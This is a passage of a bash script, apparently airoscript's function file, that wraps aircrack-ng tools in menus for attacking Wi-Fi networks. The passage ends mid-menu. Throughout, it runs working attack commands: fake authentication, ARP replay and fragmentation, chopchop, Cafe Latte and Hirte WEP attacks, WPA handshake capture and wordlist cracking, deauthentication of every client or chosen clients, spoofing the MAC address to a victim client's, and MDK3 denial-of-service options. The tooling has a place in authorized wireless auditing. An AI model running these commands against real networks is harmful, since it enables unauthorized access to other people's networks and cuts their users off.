# Funcion file used by airoscript
CHOICES="1 2 3 4 5 6 7 8 9 10 11 12"
export TEXTDOMAINDIR=/usr/share/locale
export TEXTDOMAIN=airoscript
function menu {
  echo -e "`gettext \"Select next action
  ### 1) Scan    - Scan for target    ###
  ### 2) Select  - Select target      ###
  ### 3) Attack  - Attack target      ###
  ### 4) Crack   - Get target key     ###
  ### 5) Fakeauth- Auth with target   ###
  ### 6) Deauth  - Deauth from target ###
  ### 7) Others  - Various utilities  ###
  ### 8) Inject  - Jump to inj. menu  ###
  ### 9) Exit    - Quits              ###\"`"
}

##################################################################################
##################################################################################
######################### This is for SCAN (1) option: ###########################
##################################################################################
##################################################################################
function choosetype {
while true; do
  clear
  echo -e "`gettext \"#######################################\\n
###     Select AP specification     ###
###                                 ###
###   1) No filter                  ###
###   2) OPN (open)                 ###
###   3) WEP                        ###
###   4) WPA                        ###
###   5) WPA1                       ###
###   6) WPA2                       ###
###                                 ###
#######################################\" `"

  read yn
  echo ""
  case $yn in
    1 ) ENCRYPT="" ; break ;;
    2 ) ENCRYPT="OPN" ; break ;;
    3 ) ENCRYPT="WEP" ; break ;;
    4 ) ENCRYPT="WPA" ; break ;;
    5 ) ENCRYPT="WPA1" ; break ;;
    6 ) ENCRYPT="WPA2" ; break ;;
    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;

  esac
done 
}

function choosescan {
while true; do
  echo -e " `gettext \"#######################################
  ###  Select channel to use          ###
  ###                                 ###
  ###   1) Channel Hopping            ###
  ###   2) Specific channel(s)        ###
  ###                                 ###
  ########################################\"`"
  read yn
  echo ""
  case $yn in
    1 ) Scan;break;;
    2 ) Scanchan;break;;  
    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
  esac
done 
}
	#Subproducts of choosescan.
	function Scan {
		clear
		rm -rf $DUMP_PATH/dump*
		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Scanning for targets'`" $TOPLEFTBIG $BGC $BACKGROUND_COLOR $FGC $DUMPING_COLOR $EXECFLAG $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
	}

	function Scanchan {
	  echo -e "`gettext \"######################################
	  ###    Input channel number         ###
	  ###                                 ###
	  ###  A single number   6            ###
	  ###  A range           1-5          ###
	  ###  Multiple channels 1,1,2,5-7,11 ###
	  ###                                 ###
	  #######################################\"`"
		read channel_number
		echo -e "`gettext \"You typed: $channel_number\"`"
		set -- ${channel_number}
		clear
		rm -rf $DUMP_PATH/dump*
		$AIRMON start $WIFI $channel_number
		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Scanning for targets on channel'` $channel_number" $TOPLEFTBIG $BGC $BACKGROUND_COLOR $FGC $DUMPING_COLOR $EXECFLAG $AIRODUMP -w $DUMP_PATH/dump --channel $channel_number --encrypt $ENCRYPT -a $WIFI
	}

##################################################################################
##################################################################################
######################### This is for SELECT (2) option: ######################################
##################################################################################
##################################################################################
function Parseforap {
	i=0
	ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
	head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
	clear

	echo -e "`gettext \"\\tDetected Access point list\"`\n"
	echo -e "`gettext \"#\\tMAC\\t\\tCHAN\\tSECU\\tPOWER\\t#CHAR\\tSSID\"`\n"

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
	 longueur=${#MAC}
	   if [ $longueur -ge 17 ]; then
	    i=$(($i+1))
	    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
	    aidlenght=$IDLENGTH
	    assid[$i]=$ESSID
	    achannel[$i]=$CHANNEL
	    amac[$i]=$MAC
	    aprivacy[$i]=$PRIVACY
	    aspeed[$i]=$SPEED
	   fi
	done < $DUMP_PATH/dump-02.txt

	echo ""
	echo -e "`gettext \"        Select target             \"`"
	read choice

	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=${achannel[$choice]}
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
}


function choosetarget {
while true; do
  clear
  echo -e  "`gettext \"  #######################################
  ### Do you want to select a client? ###
  ###                                 ###
  ###   1) Yes, only associated       ###
  ###   2) No i dont want to          ###
  ###   3) Try to detect some         ###
  ###   4) Yes show me the clients    ###
  ###   5) Correct the SSID first     ###
  ###                                 ###
  #######################################\"`"
  read yn
  case $yn in
    1 ) listsel2  ; break ;;
    2 ) break ;;
    3 ) clientdetect && clientfound ; break ;;
    4 ) askclientsel ; break ;;
    5 ) Host_ssidinput && choosetarget ; break ;; #Host_ssidinput is called from many places, not putting it here.
    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
  esac
done 
}
 # Those are subproducts of choosetarget.
	# List clients, (Option 1)
	function listsel2 {
	HOST=`cat $DUMP_PATH/dump-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
		clear
	  echo -e "`gettext \"
	  #######################################
	  ###                                 ###
	  ###       Select client now         ###
	  ###  These clients are connected to ###
	  ###          $Host_SSID             ###
	  ###                                 ###
	  #######################################\"`"
		select CLIENT in $HOST;
			do
			export Client_MAC=` echo $CLIENT | awk '{
					split($1, info, "," )
					print info[1]  }' `	
			break;
		done
	}


	# This way we detect clients. (Option 3)
	function clientdetect {
		iwconfig $WIFI channel $Host_CHAN
		capture & deauthall & menufonction # Those functions are used from many others, so I dont let them here, they'll be independent.
	}

	function clientfound {
		while true; do
		  clear
		  echo -e "`gettext \"
		  #######################################
		  ###  Did you find desired client?   ###
		  ###                                 ###
		  ###   1) Yes, someone associated    ### 
		  ###   2) No, no clients showed up   ###
		  ###                                 ###
		  #######################################\"`"
		  read yn
		  case $yn in
		    1 ) listsel3 ; break ;;
		    2 ) break ;;
		    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
		  esac
		done 
		}
		
		function listsel3 {
			HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
			clear
			echo -e "`gettext \"#######################################
			###                                 ###
			###       Select client now         ###
			###  These clients are connected to ###
			###          $Host_SSID             ###
			###                                 ###
			#######################################\"`"
				select CLIENT in $HOST;
				do
					export Client_MAC=` echo $CLIENT | awk '{
						split($1, info, "," )
						print info[1]  }' `	
					break;
				done
		}

	# Show clientes (Option 4)
	function askclientsel {
		while true; do
		  clear
		  echo "`gettext \"#######################################
		  ###      Select next step           ###
		  ###                                 ###
		  ###   1) Detected clients           ###
		  ###   2) Manual Input               ###
		  ###   3) Associated client list     ###
		  ###                                 ###
		  #######################################\"`"
		  read yn
		  echo ""
		  case $yn in
		    1 ) asklistsel ; break ;;
		    2 ) clientinput ; break ;;
		    3 ) listsel2 ; break ;;
		    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
		  esac
	done 
	}
	
	
		function asklistsel {
			while true; do
				clear
				echo -e "`gettext \"#######################################
				###      Select next step           ###
				###                                 ###
				###   1) Clients of $Host_SSID      ###
				###   2) Full list (all MACs)       ###
				###                                 ###
				#######################################\"`"
				
				if [ "$Host_SSID" = $'\r' ]
				then
					Host_SSID="`gettext \"No SSID has been detected!\"`"
				fi
				
				echo  ""
				read yn
  
				case $yn in
					1 ) listsel2 ; break ;;
					2 ) listsel1 ; break ;;
					* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
				esac
			done 
		}
		
		
			function listsel1 {
				HOST=`cat $DUMP_PATH/dump-01.txt | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
				clear
				echo -e "`gettext \"#######################################
				###                                 ###
				###       Select client now         ###
				###                                 ###
				#######################################\"`"
				select CLIENT in $HOST;
				do
					export Client_MAC=` echo $CLIENT | awk '{
						split($1, info, "," )
						print info[1]  }' `	
					break;
				done
			}

		function clientinput {
			echo -e "`gettext \"#######################################
			###                                 ###
			###   Type in client mac now        ###
			###                                 ###
			#######################################\"`"
			read Client_MAC
			echo -e "`gettext \"#######################################
			###                                 ###
			###   You typed: $Client_MAC  ###
			###                                 ###
			#######################################\"`"
			set -- ${Client_MAC}
		}
		


##################################################################################
##################################################################################
######################### This is for ATTACK (3) option: #########################
##################################################################################
##################################################################################

function witchattack {
	if [ "$Host_ENC" = "WEP" ]
	then
		monitor_interface2
		attackwep
	elif [ "$Host_ENC" = "WPA" ]
	then
		monitor_interface2
		wpahandshake
	else
		attackopn
	fi			
}

	# If encryption detected...
	function monitor_interface2 {
		if [ "$TYPE" = "RalinkUSB" ]
		then
			IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
			iwconfig $WIFI mode monitor channel $Host_CHAN
			echo $IS_MONITOR
		elif [ "$TYPE" = "Ralinkb/g" ]
		then
			IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
			echo $IS_MONITOR
			iwpriv $WIFI rfmontx 1
			iwpriv $WIFI forceprism 1
	
		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
		then
			#IS_MONITOR=`$AIRMON start wifi0 $Host_CHAN |grep monitor`
			#$AIRMON stop ath0
			#echo $IS_MONITOR
			echo -e "`gettext \"Atheros device, not spamming another one => Doing nothing\"`"
		else
			IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
			echo -e "`gettext \"Running standard monitor mode command\"`"
			echo $IS_MONITOR
		fi 
	}
	# If wep
	function attackwep {
	while true; do
	  clear
	  echo -e "`gettext \"#######################################
	  ### Attacks not using a client      ###
	  ### 1)  Fake auth => Automatic      ###
	  ### 2)  Fake auth => Interactive    ###
	  ### 3)  Fragmentation attack        ###
	  ### 4)  Chopchop attack             ###
	  ### 5)  Cafe Latte attack           ###
	  ### 6)  Hirte attack                ###
	  #######################################
	  ### Attacks using a client          ###
	  ### 7)  ARP replay => Automatic     ###
	  ### 8)  ARP replay => Interactive   ###
	  ### 9)  Fragmentation attack        ###
	  ###10)  Frag. attack on client      ###
	  ###11)  Chopchop attack             ###
	  #######################################
	  ### Injection if xor file generated ### 
	  ###12) ARP inject from xor (PSK)    ###
	  ###13) Return to main menu          ###\"`"
	  read yn
	  echo ""
	  case $yn in
	    1 ) attack ; break ;;
	    2 ) fakeinteractiveattack ; break ;;
	    3 ) fragnoclient ; break ;;
	    4 ) chopchopattack ; break ;;
	    5 ) cafelatteattack ; break ;;
	    6 ) hirteattack ; break ;;
	    7 ) attackclient ; break ;;
	    8 ) interactiveattack ; break ;;
	    9 ) fragmentationattack ; break ;;
	    10 ) fragmentationattackclient ; break ;;   
	    11 ) chopchopattackclient ; break ;;
	    12 ) pskarp ; break ;;
	    13 ) break ;;
	    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
	  esac
	done 
	}
		# Subproducts of attackwep function:

		#Ooption 1 (fake auth auto)
		function attack {
			capture & $TERMINAL $HOLD $TITLEFLAG "`gettext 'Injection: Host: $Host_MAC'`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & fakeauth3 & menufonction
		}
		#Option 2 (fake auth interactive)
		function fakeinteractiveattack {
			capture & $TERMINAL $HOLD $TITLEFLAG  "`gettext 'Interactive Packet Sel on Host: $Host_SSID'`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & fakeauth3 & menufonction
		}

		#Option 3 (fragmentation attack)
		function fragnoclient {
			rm -rf fragment-*.xor
			rm -rf $DUMP_PATH/frag_*.cap
			rm -rf $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng # FIXME Is this a good idea? I think we should save pids of what we launched, and then kill them.
		$TERMINAL -hold $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG  "`gettext  'Fragmentation attack on $Host_SSID'` " $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth3 &  injectmenu
			}

		#Option 4 (chopchopattack)
		function chopchopattack {
			clear
			rm -rf $DUMP_PATH/$Host_MAC*
			rm -rf replay_dec-*.xor
			capture &  fakeauth3 &  $TERMINAL -hold $TITLEFLAG  "`gettext 'ChopChoping: $Host_SSID'` " $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $EXECFLAG $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI & injectmenu
		}
		#Option 5 (caffe late attack)
		function cafelatteattack {
			capture & $TERMINAL $HOLD $TITLEFLAG  "`gettext 'Cafe Latte Attack on: $Host_SSID'` " $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $WIFI & fakeauth3 & menufonction
			}

		#Option 6 (hirte attack)
		function hirteattack {
			capture & $TERMINAL $HOLD $TITLEFLAG \"`gettext "Hirte Attack on: $Host_SSID"`\" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $WIFI & fakeauth3 & menufonction
		}

		#Option 7 (Auto arp replay)
		function attackclient {
			capture & $TERMINAL $HOLD $TITLEFLAG "`gettext 'Injection:'` `gettext 'Host'` : $Host_MAC `gettext 'Client'` : $Client_MAC" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
		}

		#Option 8 (interactive arp replay) 

		function interactiveattack {
			capture & $TERMINAL $HOLD $TITLEFLAG "`gettext 'Interactive Packet Sel on:'` $Host_SSID" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
		}

		#Option 9 (fragmentation attack)
		function fragmentationattack {
			rm -rf fragment-*.xor
			rm -rf $DUMP_PATH/frag_*.cap
			rm -rf $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng
			$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Fragmentation attack on $Host_SSID'`" $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  injectmenu
		}

		#Option 10 (fragmentation attack with client)
		function fragmentationattackclient {
			rm -rf fragment-*.xor
			rm -rf $DUMP_PATH/frag_*.cap
			rm -rf $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng
			$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Fragmentation attack on $Host_SSID'`" $EXECFLAG $AIREPLAY -7 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  injectmenu
		}
		#Option 11
		function chopchopattackclient {
			clear
			rm -rf $DUMP_PATH/$Host_MAC*
			rm -rf replay_dec-*.xor
			capture &  $TERMINAL -hold $TITLEFLAG "`gettext 'ChopChoping: $Host_SSID'`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $EXECFLAG $AIREPLAY --chopchop -h $Client_MAC $WIFI & injectmenu
		}
		#Option 12 (pskarp)
		function pskarp {
			rm -rf $DUMP_PATH/arp_*.cap
			$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
			capture & $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending forged ARP to: $Host_SSID'`" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
		}
		# End of subproducts.

	# If wpa
	function wpahandshake {
		clear
		rm -rf $DUMP_PATH/$Host_MAC*
		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Capturing data on channel:'` $Host_CHAN" $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
	}

	function attackopn { # If no encryption detected
	  if [ "$Host_SSID" = "" ] 
	  then
	 	 echo `gettext "
		 ##################################################
	 	 ###   You need to select a target              ###
	 	 ##################################################"`
	  else
		clear
		echo `gettext "ERROR: $Host_SSID is not encrypted"`
	  fi
	}


##################################################################################
##################################################################################
######################### This is for CRACK (4)  option: ######################################
##################################################################################
##################################################################################
function witchcrack {
		if [ "$UNSTABLE" = "1" ]
		then
			while true; do
				echo -e "`gettext \"
				#######################################
				###      WEP/WPA CRACKING OPTIONS   ###
				###                                 ###
				###   1) Use Wlandecrypter          ###
				###   2) Use aircrack-ng            ###
				###                                 ###
				#######################################\"`"
			
				read yn
				
				case $yn in
					1 ) selectcracking ; break ;;
					2 ) wld ; break ;;
					* ) echo "Unknown response. Try again" ;;
				esac
			done 
		else
			selectcracking
		fi
}

function selectcracking {
	if [ "$Host_ENC" = "WEP" ]
	then
		crack
	else
		wpacrack
	fi
}

#This is crack function, for WEP encryption:
	function crack {
		while true; do
		echo -e "`gettext \"
		#######################################
		###      WEP CRACKING OPTIONS       ###
		###                                 ###
		###   1) aircrack-ng PTW attack     ###
		###   2) aircrack-ng standard       ###
		###   3) aircrack-ng user options   ###
		###                                 ###
		#######################################\"`"
		read yn
		case $yn in
		1 ) crackptw ; break ;;
		2 ) crackstd ; break ;;
		3 ) crackman ; break ;;
		* ) echo "unknown response. Try again" ;;
		esac
		done 
	}
	
		# Those are subproducts of crack for wep.
		function crackptw   {
			$TERMINAL -hold $TITLEFLAG "Aircracking-PTW: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
		}

		function crackstd   {
			$TERMINAL -hold $TITLEFLAG "Aircracking: $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
		}
	
		function crackman {
			echo -n "type fudge factor"
			read FUDGE_FACTOR
			echo You typed: $FUDGE_FACTOR
			set -- ${FUDGE_FACTOR}
			echo -e -n "`gettext \"type encryption size 64,128 etc...\"`"
			read ENC_SIZE
			echo You typed: $ENC_SIZE
			set -- ${ENC_SIZE}
			$TERMINAL -hold $TITLEFLAG "`gettext 'Manual cracking:'` $Host_SSID" $TOPRIGHTBIG $EXECFLAG $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
		}

	# This is for wpa cracking
	function wpacrack {
		$TERMINAL -hold $TOPRIGHT $TITLEFLAG "Aircracking: $Host_SSID" $EXECFLAG $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
	}
	
##################################################################################
##################################################################################
######################### This is for Fake auth  (5)  option: ###################################
##################################################################################
##################################################################################
# This is the function to select Target from a list
## MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room  
## And HIRTE for making all those great patch and fixing the SSID issue	

function choosefake {
	while true; do
		clear
		echo -e "`gettext \"
		#######################################
		###   Select fakeauth method        ###
		###                                 ###
		###   1) Conservative               ###
		###   2) Standard                   ###
		###   3) Progressive                ###
		###                                 ###
		#######################################\"`"
		read yn
		case $yn in
			1 ) fakeauth1 ; break ;;
			2 ) fakeauth2 ; break ;;
			3 ) fakeauth3 ; break ;;
			* ) echo "unknown response. Try again" ;;
		esac
	done 
}

# Those are subproducts of choosefake
	function fakeauth1 {
		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'` $Host_SSID " $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
	}
	function fakeauth2 {
		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'`$Host_SSID" $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
	}
	function fakeauth3 {
		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'`$Host_SSID" $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
	}
	
##################################################################################
##################################################################################
######################### This is for deauth  (6)  option:       ###################################
##################################################################################
##################################################################################
function choosedeauth {
	while true; do
	clear
	echo -e "`gettext \"
	#######################################
	###   Who do you want to deauth ?   ###
	###                                 ###
	###   1) Everybody                  ###
	###   2) Myself (the Fake MAC)      ###
	###   3) Selected client            ###
	###                                 ###
	#######################################\"`"
	read yn
	case $yn in
	1 ) deauthall ; break ;;
	2 ) deauthfake ; break ;;
	3 ) deauthclient ; break ;; 
	* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;

	esac
	done 
}

	# Subproducts of choosedeauth
		function deauthall {
			$TERMINAL $HOLD $TOPRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Kicking everybody from:'` $Host_SSID" $EXECFLAG $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
		}
		
		function deauthclient {
			$TERMINAL $HOLD $TOPRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Kicking $Client_MAC from:'` $Host_SSID" $EXECFLAG $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI
		}
		
		function deauthfake {
			$TERMINAL $HOLD $TOPRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Kicking'` $FAKE_MAC ( $Host_SSID )" $EXECFLAG $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI
		}


##################################################################################
##################################################################################
######################### This is for deauth  (7)  option:       ###################################
##################################################################################
##################################################################################
function optionmenu {
	while true; do
	echo -e "`gettext \"
	#######################################
	###  Select task to perform         ###
	###                                 ###
	###   1) Test injection             ###
	###   2) Select another interface   ###
	###   3) Reset selected interface   ###
	###   4) Change MAC of interface    ###
	###   5) Mdk3                       ###
	###   6) Wesside-ng                 ###
	###   7) Enable monitor mode        ###
	###   8) Checks with airmon-ng      ###
	###   9) Return to main menu        ###
	###                                 ###
	#######################################\"`"
	read yn
	echo ""
	case $yn in
	1 ) inject_test ; break ;;
	2 ) setinterface2 ; break ;;
	3 ) cleanup ; break ;; 
	4 ) wichchangemac ; break ;;
	5 ) choosemdk ; break ;;
	6 ) choosewesside ; break ;;
	7 ) monitor_interface ; break ;;
	8 ) airmoncheck ; break ;;
	9 ) break ;;
	* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;

	esac
	done 
}

# I suppose all these are part of this option:
	# 1.
	function inject_test {
		$TERMINAL $HOLD $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $WIFI --test & menufonction
	}
	# 2.
	function setinterface2 {
		INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
		echo "   Select your interface"
		echo " "
		
		select WIFI in $INTERFACES; do
			break;
		done
		
		TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
		clear
		echo "`gettext \"Interface used is : $WIFI\"`"
		echo "`gettext \"Interface type is : $TYPE\"`"
		testmac
	}
	# 3.
	function cleanup {
		killall -9 aireplay-ng airodump-ng > /dev/null &
		$AIRMON stop $WIFI
		ifconfig $WIFI down
		clear
		sleep 2
		$CARDCTL eject
		sleep 2
		$CARDCTL insert
		ifconfig $WIFI up
		$AIRMON start $WIFI $Host_CHAN
		iwconfig $WIFI
	}
	# 4.
	function wichchangemac {
		while true; do
			echo -e "`gettext \"
			#######################################
			###      Select next step           ###
			###                                 ###
			###   1) Change MAC to FAKEMAC      ###
			###   2) Change MAC to CLIENTMAC    ###
			###   3) Manual Mac input           ###
			###                                 ###
			#######################################\"`"
			
			read yn
			
			case $yn in
				1 ) fakemacchanger ; break ;;
				2 ) macchanger ; break ;;
				3 ) macinput ; break ;;
				* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
			esac
		done 
	}	
		# And those are from wichchangemac
		function fakemacchanger {
			if [ "$TYPE" = "RalinkUSB" ]
			then
				fakechangemacrausb
			elif [ "$TYPE" = "Ralinkb/g" ]
			then
				fakechangemacwlan
			elif [ "$TYPE" = "Atherosmadwifi-ng" ]
			then
				fakechangemacath
			else
			echo -e "`gettext \"Unknow way to change mac\"`"
			fi			
		}		
			# And those from fakemacchanger
			function fakechangemacrausb {
				ifconfig $WIFI down
				iwconfig $WIFI mode managed
				sleep 2
				macchanger -m $FAKE_MAC $WIFI 
				ifconfig $WIFI up
				iwconfig $WIFI mode monitor			
			}
	
			function fakechangemacwlan {
				ifconfig $WIFI down
				iwconfig $WIFI mode managed
				sleep 2
				macchanger -m $FAKE_MAC $WIFI 
				ifconfig $WIFI up
				iwconfig $WIFI mode monitor		
			}
			
			function fakechangemacath {
				ifconfig $WIFI down
				iwconfig $WIFI mode managed
				sleep 2
				macchanger -m $FAKE_MAC $WIFI
				ifconfig $WIFI up
				iwconfig $WIFI mode monitor			
			}
		
	

		function macchanger {
			if [ "$TYPE" = "RalinkUSB" ]
			then
				changemacrausb
			elif [ "$TYPE" = "Ralinkb/g" ]
			then 
				changemacwlan
			elif [ "$TYPE" = "Atherosmadwifi-ng" ]
			then
				changemacath
			else
				echo -e "`gettext \"Unknow way to change mac\"`"
			fi			
		}
			# Those are part of macchanger
			function changemacrausb {
				ifconfig $WIFI down
				iwconfig $WIFI mode managed
				sleep 2
				macchanger -m $Client_MAC $WIFI
				ifconfig $WIFI up
				iwconfig $WIFI mode monitor			
			}
			
			function changemacwlan {
				ifconfig $WIFI down
				iwconfig $WIFI mode managed
				sleep 2
				macchanger -m $Client_MAC $WIFI
				ifconfig $WIFI up
				iwconfig $WIFI mode monitor			
			}
			
			function changemacath {
				ifconfig $WIFI down
				iwconfig $WIFI mode managed
				sleep 2
				macchanger -m $Client_MAC $WIFI
				ifconfig $WIFI up
				iwconfig $WIFI mode monitor			
			}
			
		function macinput {
			echo -n -e "`gettext \"OK, now type in new MAC: \"`"
			read MANUAL_MAC
			echo You typed: $MANUAL_MAC
			set -- ${MANUAL_MAC}
			manualmacchanger
		}

			function manualmacchanger {
				if [ "$TYPE" = "RalinkUSB" ]
				then
					manualchangemacrausb
				elif [ "$TYPE" = "Ralinkb/g" ]
				then
					manualchangemacwlan
				elif [ "$TYPE" = "Atherosmadwifi-ng" ]
				then
					manualchangemacath
				else
					echo "Unknow way to change mac"
				fi			
			}
			
				function manualchangemacrausb {
					ifconfig $WIFI down
					iwconfig $WIFI mode managed
					sleep 2
					macchanger -m $Client_MAC $WIFI
					ifconfig $WIFI up
					iwconfig $WIFI mode monitor			
				}

				function manualchangemacwlan {
					ifconfig $WIFI down
					iwconfig $WIFI mode managed
					sleep 2
					macchanger -m $Client_MAC $WIFI
					ifconfig $WIFI up
					iwconfig $WIFI mode monitor				
				}

				function manualchangemacath {
					ifconfig $WIFI down
					iwconfig $WIFI mode managed
					sleep 2
					macchanger -m $Client_MAC $WIFI
					ifconfig $WIFI up
					iwconfig $WIFI mode monitor				
				}

	# 5. 
		function choosemdk {
			while true; do
				clear
				echo "`gettext \"
				#######################################
				###   Choose MDK3 Options           ###
				###                                 ###
				###   1) Deauthentication           ###
				###   2) Prob selected AP           ###
				###   3) Select another target      ###
				###   4) Authentication DoS         ###
				###   5) Return to main menu        ###
				###                                 ###
				#######################################\"`"
				read yn
				
				case $yn in
